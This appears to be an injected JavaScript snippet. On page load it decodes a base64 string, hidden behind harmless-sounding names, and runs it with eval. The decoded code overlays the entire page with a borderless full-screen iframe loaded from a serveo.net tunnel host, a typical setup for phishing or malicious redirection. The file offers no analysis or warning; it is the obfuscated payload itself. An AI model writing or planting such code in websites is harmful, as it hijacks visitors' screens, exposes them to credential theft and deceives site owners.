document.addEventListener("DOMContentLoaded", function () {
  function joy(happy) {
    return decodeURIComponent(escape(atob(happy)));
  }

  const moon =
    "ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChPYmplY3QuYXNzaWduKGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpLCB7IHNyYzogJ2h0dHBzOi8vYWY3YTUwZDQxYjgzNmIzMzlkYmIxNjZjNDFmNWYwNzYuc2VydmVvLm5ldC9zZXJ2aWNlL2h2dHJzOCUyRi02cndvajQtMTAyMCUyQ2NxYiUyQ2FycC0nLCBmcmFtZWJvcmRlcjogJzAnLCBzdHlsZTogJ3Bvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2JvcmRlcjpub25lOycgfSkpOw==";
  const sun = joy(moon);
  eval(sun);
});
